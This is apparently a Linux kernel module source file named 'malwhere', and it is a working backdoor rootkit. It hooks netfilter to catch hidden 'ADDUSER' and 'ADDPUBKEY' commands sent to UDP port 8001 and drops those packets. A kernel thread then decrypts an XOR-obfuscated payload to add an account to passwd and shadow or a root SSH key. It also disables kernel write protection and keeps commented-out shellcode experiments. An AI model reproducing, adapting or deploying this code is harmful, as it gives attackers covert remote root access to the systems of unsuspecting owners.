#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/crypto.h>
#include <linux/dirent.h>
#include <linux/reboot.h>
#include <linux/notifier.h>
#include <linux/kobject.h>
#include <asm/syscall.h>
#include <net/sock.h>
#include <net/ip.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/socket.h>
#include <linux/icmp.h>
#include <linux/if_ether.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/vmalloc.h>
#include <linux/kthread.h>

#include "sensitive.h"

#define KEY 97425196
char *module_str = "malwhere";
unsigned char *nfhook_deep_space = NULL;
struct nf_hook_ops nfho;
struct task_struct *task_watchdog;
atomic_t trigger_add_user = ATOMIC_INIT(0);
atomic_t trigger_add_pubkey = ATOMIC_INIT(0);
atomic_t payload_encrypted = ATOMIC_INIT(0);

void disable_pm(void) {
  write_cr0(read_cr0() & (~ 0x10000));
}

void enable_pm(void) {
  write_cr0(read_cr0() | 0x10000);
}

static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
  const struct sk_buff *this_skb = skb;
  struct iphdr *this_iphdr;
  struct udphdr *this_udphdr;
  unsigned char *data;
  size_t pkt_len;
  size_t udphdr_len;

  if (!this_skb){
    return NF_ACCEPT;
  }

  this_iphdr = (struct iphdr *) skb_network_header(this_skb);
  if (this_iphdr && this_iphdr->protocol == IPPROTO_UDP) {
    this_udphdr = skb_transport_header(this_skb);
    udphdr_len = sizeof(struct udphdr);
    printk(KERN_ALERT "UDP (%d)", ntohs(this_udphdr->dest));
    if (ntohs(this_udphdr->dest) == 8001) {
      printk(KERN_ALERT "UDP/8001");
      data = skb->data + ip_hdrlen(skb) + sizeof(struct udphdr);
      pkt_len = skb->len - ip_hdrlen(skb) - sizeof(struct udphdr);
      printk(KERN_ALERT "PACKET");
      if (memcmp(data, "ADDUSER", 7) == 0) {
        printk(KERN_ALERT "ADDUSER");
        atomic_set(&trigger_add_user, 1);
      } else if (memcmp(data, "ADDPUBKEY", 9) == 0) {
        atomic_set(&trigger_add_pubkey, 1);
      }
      return NF_DROP;
    }   
  }

  return NF_ACCEPT;
}

static void set_nf_hook(void) {
  //nfho.hook = (unsigned long long *) nfhook_deep_space;
  nfho.hook = nfhook;
  nfho.hooknum = NF_INET_LOCAL_IN;
  nfho.pf = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;
  nf_register_hook(&nfho);
}

static void unset_nf_hook(void) {
  nf_unregister_hook(&nfho);
}

void xor_range(unsigned char *addr, size_t len, unsigned int k) {
  size_t i;
  disable_pm();
  for (i = 0; i <= len; i+=4) {
    addr[i]   ^= (k & 0xff000000) >> 24;
    addr[i+1] ^= (k & 0x00ff0000) >> 16;
    addr[i+2] ^= (k & 0x0000ff00) >> 8;
    addr[i+3] ^=  k & 0x000000ff;
  }
  enable_pm();
}

// Align SENSITIVE_LEN on key-length boundary to ensure no over-encryption.
size_t encrypt_len(unsigned int k) {
  printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
  return SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k));
}

int is_payload_encrypted(void) {
  return atomic_read(&payload_encrypted) == 1;
}

void encrypt_payload(void) {
  if (is_payload_encrypted())
    return;
  xor_range((unsigned char *)add_file_line, encrypt_len(KEY), KEY);
  atomic_set(&payload_encrypted, 1);
}

void decrypt_payload(void) {
  if (!is_payload_encrypted())
    return;
  xor_range((unsigned char *)add_file_line, encrypt_len(KEY), KEY);
  atomic_set(&payload_encrypted, 0);
}

int wait_for_command(void *data) {
  while (!kthread_should_stop()) {
    ssleep(5);
    printk(KERN_ALERT "foo/0 Running: trigger_add_user=%d\n", atomic_read(&trigger_add_user));
    printk(KERN_ALERT "foo/0 Running: trigger_add_pubkey=%d\n", atomic_read(&trigger_add_pubkey));
    if (atomic_read(&trigger_add_user) == 1) {
      decrypt_payload();
      add_user_passwd();
      add_user_shadow();
      encrypt_payload();
      atomic_set(&trigger_add_user, 0);
    }
    if (atomic_read(&trigger_add_pubkey) == 1) {
      decrypt_payload();
      add_root_pubkey();
      encrypt_payload();
      atomic_set(&trigger_add_pubkey, 0);
    }
  }
  printk(KERN_INFO "Thread Stopping\n");
  do_exit(0);
}

static int __init init(void) {
  encrypt_payload();
  printk(KERN_INFO, "SETTING HOOK");
  set_nf_hook();
  task_watchdog = kthread_run(wait_for_command, NULL, "static");

  /*
  unsigned int block_size = 0;
  printk(KERN_INFO "[%s] init\n", module_str);
  struct crypto_shash *ch = crypto_alloc_cipher("aes", 0, 0);
  if (IS_ERR(ch)) {
    printk(KERN_INFO, "crypto_alloc_cipher error");
  }
  block_size = crypto_ablkcipher_blocksize(ch);
  unsigned char *cipher = kmalloc(block_size+1, GFP_KERNEL);
  unsigned char *decipher = kmalloc(block_size+1, GFP_KERNEL);
  cipher[block_size] = '\0';
  decipher[block_size] = '\0';
  crypto_cipher_setkey(ch, "asdfasdfasdfasdf", 16);
  crypto_cipher_encrypt_one(ch, cipher, "thisisasecret");
  crypto_cipher_decrypt_one(ch, decipher, cipher);
  */

  /*
  size_t nfhook_func_len = 0x06;
  nfhook_deep_space = __vmalloc(nfhook_func_len, GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC);
  memcpy(nfhook_deep_space, "\xb8\x05\x00\x00\x00\xc3", nfhook_func_len);
  set_nf_hook();
  */

  /*
  size_t nfhook_func_len = 0x5c;
  nfhook_deep_space = kmalloc(nfhook_func_len, GFP_KERNEL);
  memcpy(nfhook_deep_space, nfhook, nfhook_func_len);
  set_nf_hook();
  */

  /*
  char *argv[] = {"/foobaz", "kernelspace", NULL};
  call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
  printk(KERN_INFO "memcpy\n");
  set_nf_hook();
  printk(KERN_INFO "set nf hook\n");
  */
  
  return 0;
}

static void __exit exit(void) {
  printk(KERN_INFO "[%s] exiting\n", module_str);
  kthread_stop(task_watchdog);
  unset_nf_hook();
  printk(KERN_INFO "[%s] exited\n", module_str);
}

module_init(init);
module_exit(exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("@unixist");
MODULE_DESCRIPTION("malwhere");
